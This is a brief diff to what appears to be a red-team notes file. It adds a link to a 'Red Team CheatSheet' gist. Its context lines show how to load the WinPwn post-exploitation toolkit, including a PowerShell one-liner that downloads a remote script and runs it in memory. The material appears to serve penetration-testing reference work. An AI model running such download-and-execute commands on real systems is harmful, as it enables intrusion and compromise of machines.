@@ -4,3 +4,7 @@ https://github.com/S3cur3Th1sSh1t/WinPwn
 Import-Module .\WinPwn.ps1 
 or 
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')
+
+Red Team CheatSheet
+https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70
+
